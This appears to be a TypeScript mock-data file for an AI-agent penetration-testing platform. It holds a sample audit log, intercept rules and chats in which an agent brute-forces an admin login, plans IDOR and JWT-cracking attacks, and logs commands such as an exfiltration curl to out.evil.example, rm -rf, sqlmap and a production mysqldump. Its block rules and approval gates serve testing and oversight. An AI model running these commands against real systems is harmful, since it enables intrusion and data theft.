    ts: T(`2026-07-26T0${1 + (i % 3)}:${String(10 + i).padStart(2, "0")}:00Z`),
  })),
};

export const trafficDetail: TrafficDetail = {
  req: `GET /v1/orders?id=1002 HTTP/1.1
Host: api.acme.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
User-Agent: ARTEX-worker/1.0
Accept: application/json

`,
  resp: `HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 655

{
  "order_id": 1002,
  "user_id": 77,
  "amount": 1299.00,
  "address": "北京市朝阳区 ****",
  "phone": "138****6021",
  "items": [{ "sku": "A-100", "qty": 1 }]
}`,
};

// ── Security / Audit ─────────────────────────────────────────────────────────
export const audit: Audit = {
  attributions: { allow: 214, block: 6 },
  entries: [
    { ts: T("2026-07-26T03:33:00Z"), tool: "bash", action: "allow", command: "curl -s -d 'username=admin...' https://admin.acme.com/login" },
    { ts: T("2026-07-26T03:57:00Z"), tool: "bash", action: "allow", command: "curl -s -b 'session=...' https://admin.acme.com/api/users" },
    { ts: T("2026-07-26T02:10:00Z"), tool: "bash", action: "block", reason: "目标越界：out.evil.example 不在 scope 内", command: "curl https://out.evil.example/exfil" },
    { ts: T("2026-07-25T22:03:00Z"), tool: "bash", action: "allow", command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch" },
    { ts: T("2026-07-25T21:00:00Z"), tool: "bash", action: "block", reason: "破坏性命令门控：rm -rf 被拒绝", command: "rm -rf /var/www" },
    { ts: T("2026-07-25T20:30:00Z"), tool: "bash", action: "allow", command: "git-dumper https://www.acme.com/.git/ /tmp/acme" },
  ],
};

// ── LLM profiles ─────────────────────────────────────────────────────────────
export const llmProfiles: LLMProfile[] = [
  { id: "1", name: "Claude Opus 4.8", format: "anthropic", model: "claude-opus-4-8", api_key_hint: "…a3f2", rate_per_second: 0, rate_per_minute: 0, context_window_k: 1000, reasoning_effort: "high", is_default: true },
  { id: "2", name: "DeepSeek V4", format: "openai", base_url: "https://api.deepseek.com/v1", model: "deepseek-v4-flash", api_key_hint: "…9c11", rate_per_second: 0, rate_per_minute: 60, context_window_k: 128, reasoning_effort: "", is_default: false },
];

export const llmConfig = {
  configured: true, provider: "anthropic", model: "claude-opus-4-8",
  base_url: "", proxy: "", key_set: true,
  rate_per_second: 0, rate_per_minute: 0, context_window_k: 1000, reasoning_effort: "high",
};

// ── Agents ───────────────────────────────────────────────────────────────────
export const agents: Agent[] = [
  { id: "1", key: "goals", name: "目标拆解器", role: "goals", builtin: true, enabled: true, description: "把任务目标拆成可探索的子目标", max_turns: 8, mcp_count: 0, skill_count: 1, tool_count: 3 },
  { id: "2", key: "planner", name: "规划者", role: "planner", builtin: true, enabled: true, description: "读探索路线、判断目标达成、生成意图", max_turns: 0, mcp_count: 1, skill_count: 2, tool_count: 9 },
  { id: "3", key: "mainagent", name: "主 Agent", role: "mainagent", builtin: true, enabled: true, description: "人在环路对话，注入 hint / 高优意图", max_turns: 0, web_search: true, mcp_count: 2, skill_count: 3, tool_count: 11 },
  { id: "4", key: "worker", name: "Work Agent", role: "worker", builtin: true, enabled: true, description: "claim 意图 → 跑 Kali 工具 → 图写回", max_turns: 40, run_seconds: 1800, web_search: false, interactive_shell: true, mcp_count: 2, skill_count: 3, tool_count: 14 },
  { id: "5", key: "recon-bot", name: "侦察机器人（自定义）", role: "custom", builtin: false, enabled: true, description: "定时对新资产做被动侦察", max_turns: 12, mcp_count: 1, skill_count: 1, tool_count: 4 },
];

const promptVars: PromptVar[] = [
  { name: "Goal", description: "当前任务目标", example: "拿到 acme.com 后台管理权限", source: "runtime" },
  { name: "AssetSummary", description: "资产图概览", example: "6 子域 / 3 IP / 4 应用 / 4 端点", source: "distilled" },
  { name: "RouteHint", description: "探索路线提示", example: "优先后台与 API 越权面", source: "exploration" },
];

const promptVersions: PromptVersion[] = [
  { version: 3, ts: T("2026-07-25T10:00:00Z"), note: "加强越权探测引导", template_text: "你是 ARTEX 的规划者……" },
  { version: 2, ts: T("2026-07-20T10:00:00Z"), note: "初版微调", template_text: "你是 ARTEX 的规划者(v2)……" },
];

export function agentDetail(key: string): AgentDetail {
  const a = agents.find((x) => x.key === key) ?? agents[1];
  return {
    agent: a,
    prompt: `你是 ARTEX 的「${a.name}」。\n目标：{{.Goal}}\n资产概览：{{.AssetSummary}}\n路线提示：{{.RouteHint}}\n请基于以上信息推进探索，并通过工具把结果写回图。`,
    variables: promptVars,
    versions: promptVersions,
    visibility: { mcp: [1, 2], skill: ["api-recon", "playwright-cli"] },
    wrapup_prompt: "",
    wrapup_default: "时间/步数将尽，请总结已确认发现并标记意图终态。",
    wrapup_max_turns: 0,
    wrapup_max_turns_default: 3,
    task_timeout_wrapup_supported: a.key === "worker" || a.key === "planner",
    task_timeout_wrapup_default: "任务超时，请立即收尾并落库当前结论。",
    task_timeout_wrapup_max_turns_default: 2,
  };
}

// ── MCP ──────────────────────────────────────────────────────────────────────
export const mcpServers: MCPServer[] = [
  { id: 1, name: "shodan", transport: "http", url: "https://mcp.shodan.io/sse", args: [], env: {}, enabled: true, tools: ["host_info", "search", "dns_resolve"] },
  { id: 2, name: "playwright", transport: "stdio", command: "npx", args: ["-y", "@playwright/mcp"], env: {}, enabled: true, tools: ["browser_navigate", "browser_click", "browser_snapshot"] },
];

export const mcpToolsById: Record<number, MCPTool[]> = {
  1: [
    { name: "host_info", description: "查询某 IP 的 Shodan 主机信息" },
    { name: "search", description: "Shodan 搜索" },
    { name: "dns_resolve", description: "DNS 解析" },
  ],
  2: [
    { name: "browser_navigate", description: "浏览器打开 URL" },
    { name: "browser_click", description: "点击元素" },
    { name: "browser_snapshot", description: "抓取可访问性快照" },
  ],
};

// ── Skills ───────────────────────────────────────────────────────────────────
export const skills: SkillItem[] = [
  { name: "api-recon", description: "对 REST/GraphQL API 做侦察与越权面枚举；发现新 API 端点时使用。", license: "MIT", mcps: [], files: ["SKILL.md", "scripts/enum.py"] },
  { name: "playwright-cli", description: "用 Playwright 驱动浏览器做动态爬取与截图；需要渲染 JS 站点时使用。", mcps: ["playwright"], files: ["SKILL.md"] },
  { name: "scopesentry", description: "从 ScopeSentry 拉取资产并归并到公司范围；批量导入资产时使用。", files: ["SKILL.md", "assets/mapping.md"] },
];

// ── Tools ────────────────────────────────────────────────────────────────────
export const tools: Tool[] = [
  { key: "bash", system: true, description: "在 Kali 环境执行 shell 命令（受 scope/破坏性门控）", schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] }, agents: ["worker", "mainagent"], enabled: true, kind: "builtin" },
  { key: "report_finding", system: true, description: "上报一个安全发现并连到相关节点", schema: { type: "object", properties: { vulnclass: { type: "string" }, severity: { type: "string" }, summary: { type: "string" }, evidence: { type: "string" } }, required: ["vulnclass", "severity", "summary"] }, agents: ["worker"], enabled: true, kind: "builtin" },
  { key: "upsert_asset", system: true, description: "写入/更新资产节点", schema: { type: "object", properties: { type: { type: "string" }, value: { type: "string" } } }, agents: ["worker"], enabled: true, kind: "builtin" },
  { key: "list_goals", system: true, description: "列出当前任务的目标与达成状态", schema: { type: "object", properties: {} }, agents: ["planner"], enabled: true, kind: "builtin" },
  { key: "nuclei_scan", system: false, description: "自定义：用 nuclei 跑指定模板", schema: { type: "object", properties: { target: { type: "string" }, template: { type: "string" } }, required: ["target"] }, agents: ["worker"], enabled: true, kind: "command", exec: { command: "nuclei", args: ["-u", "{{target}}"] } },
];

// ── Settings ─────────────────────────────────────────────────────────────────
export const settings: Settings = {
  traffic_capture: true,
  web_search_enabled: true,
  web_search_backend: "ddgs",
  brave_key_set: false,
  tavily_key_set: true,
  web_search_proxy: "",
  python_interpreter: "/usr/bin/python3",
  workers: 3,
};

// ── Intercept ────────────────────────────────────────────────────────────────
export const interceptRules: InterceptRule[] = [
  { id: 1, name: "破坏性命令需审批", enabled: true, priority: 10, match_target: "tool_input", match_type: "regex", pattern: "rm\\s+-rf|mkfs|dd\\s+if=", action: "ask", message: "检测到破坏性命令，需人工审批", timeout_enabled: true, timeout_seconds: 120, timeout_action: "deny", created_at: T("2026-07-20T10:00:00Z"), updated_at: T("2026-07-20T10:00:00Z") },
  { id: 2, name: "外发流量直接拒绝", enabled: true, priority: 20, match_target: "tool_input", match_type: "string", pattern: "exfil", action: "deny", message: "疑似外发数据", timeout_enabled: false, timeout_seconds: 0, timeout_action: "deny", created_at: T("2026-07-21T10:00:00Z"), updated_at: T("2026-07-21T10:00:00Z") },
];

export const interceptPending: InterceptPending[] = [
  { id: 101, rule_id: 1, task_id: "t-acme-web", agent_name: "work#3", tool_name: "bash", tool_input: { command: "mysqldump -h 203.0.113.10 -uroot acme_prod > /tmp/dump.sql" }, status: "pending", created_at: T("2026-07-26T03:58:00Z") },
];

export const interceptHistory: InterceptApprovalRow[] = [
  { id: 90, rule_id: 1, task_id: "t-acme-web", agent_name: "work#1", tool_name: "bash", tool_input: { command: "dd if=/dev/zero of=/tmp/x" }, status: "denied", created_at: T("2026-07-25T20:00:00Z"), decided_at: T("2026-07-25T20:01:00Z"), conv_title: "", conv_agent_key: "", rule_name: "破坏性命令需审批" },
  { id: 91, task_id: "t-acme-api", agent_name: "work#2", tool_name: "bash", tool_input: { command: "nmap -sV 203.0.113.11" }, status: "allowed", created_at: T("2026-07-25T18:00:00Z"), decided_at: T("2026-07-25T18:00:05Z"), conv_title: "", conv_agent_key: "", rule_name: "" },
];

// ── Conversations (chat) ─────────────────────────────────────────────────────
export const conversations: Conversation[] = [
  { id: 1, agent_key: "mainagent", title: "acme 后台切入点讨论", llm_profile_id: 1, created_at: T("2026-07-25T10:00:00Z"), updated_at: T("2026-07-26T03:40:00Z") },
  { id: 2, agent_key: "mainagent", title: "API 越权面梳理", llm_profile_id: 2, created_at: T("2026-07-24T16:00:00Z"), updated_at: T("2026-07-24T17:20:00Z") },
];

export const conversationMessages: Record<number, Activity[]> = {
  1: [
    { seq: 1, worker: "user", ts: T("2026-07-25T10:00:00Z"), kind: "user", summary: "后台在哪，先从哪切入？" },
    { seq: 2, worker: "mainagent", ts: T("2026-07-25T10:00:04Z"), kind: "thinking", summary: "先确认 admin.acme.com 的登录页技术栈和防护（验证码/速率限制），再决定用默认口令还是字典。" },
    { seq: 3, worker: "mainagent", ts: T("2026-07-25T10:00:06Z"), kind: "tool_use", tool: "bash", tool_use_id: "c11", summary: "curl -s https://admin.acme.com/login | grep -Eo 'element-ui|captcha|csrf'" },
    { seq: 4, worker: "mainagent", ts: T("2026-07-25T10:00:08Z"), kind: "tool_result", tool: "bash", tool_use_id: "c11", summary: "element-ui\ncsrf", detail: "Element-UI 后台，有 CSRF token 但无验证码。" },
    { seq: 5, worker: "mainagent", ts: T("2026-07-25T10:00:20Z"), kind: "tool_use", tool: "bash", tool_use_id: "c12", summary: "for i in 1 2 3 4 5; do curl -s -o /dev/null -w '%{http_code}\\n' -d 'username=x&password=y' https://admin.acme.com/login; done" },
    { seq: 6, worker: "mainagent", ts: T("2026-07-25T10:00:24Z"), kind: "tool_result", tool: "bash", tool_use_id: "c12", summary: "401\\n401\\n401\\n401\\n401", detail: "连续 5 次无锁定/无验证码 → 无速率限制，可爆破。" },
    { seq: 7, worker: "mainagent", ts: T("2026-07-25T10:00:30Z"), kind: "text", summary: "结论：Element-UI 后台、无验证码、无速率限制。切入顺序：① 先跑默认口令表（admin/admin、admin/admin123、admin/123456）② 不中再上 top1000 字典。我已把「后台默认口令测试」作为高优意图注入给 work agent。" },
    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "成了吗？" },
    { seq: 9, worker: "mainagent", ts: T("2026-07-26T03:40:05Z"), kind: "text", summary: "成了 —— admin/admin123 直接登进控制台，已记为高危发现并证明「获取后台管理权限」目标达成。下一步转向读用户数据（目标②）。" },
  ],
  2: [
    { seq: 1, worker: "user", ts: T("2026-07-24T16:00:00Z"), kind: "user", summary: "帮我梳理下 api.acme.com 的越权面。" },
    { seq: 2, worker: "mainagent", ts: T("2026-07-24T16:00:05Z"), kind: "thinking", summary: "先摸 API 的鉴权方式和几个关键端点的行为，再判断 IDOR / JWT 风险。" },
    { seq: 3, worker: "mainagent", ts: T("2026-07-24T16:00:10Z"), kind: "tool_use", tool: "bash", tool_use_id: "c21", summary: "curl -s https://api.acme.com/v1/users/me -H 'Authorization: Bearer <self>' | jq '{id,role}'" },
    { seq: 4, worker: "mainagent", ts: T("2026-07-24T16:00:12Z"), kind: "tool_result", tool: "bash", tool_use_id: "c21", summary: "{ \"id\": 42, \"role\": \"user\" }", detail: "普通用户 token 可用。" },
    { seq: 5, worker: "mainagent", ts: T("2026-07-24T16:00:30Z"), kind: "tool_use", tool: "bash", tool_use_id: "c22", summary: "echo '<jwt>' | cut -d. -f1 | base64 -d; # 看算法" },
    { seq: 6, worker: "mainagent", ts: T("2026-07-24T16:00:31Z"), kind: "tool_result", tool: "bash", tool_use_id: "c22", summary: "{\"alg\":\"HS256\",\"typ\":\"JWT\"}", detail: "HS256 对称签名，若密钥弱可离线爆破伪造。" },
    { seq: 7, worker: "mainagent", ts: T("2026-07-24T16:01:00Z"), kind: "text", summary: "越权面有两条：① /v1/orders?id= 是自增数字 id → 典型 IDOR，改 id 试读他人订单；② JWT 用 HS256，试 john/hashcat 爆密钥→可伪造任意 sub 越权。我把这两条各派生成一个意图。建议先做 IDOR（成本低、影响直接）。" },
  ],
};
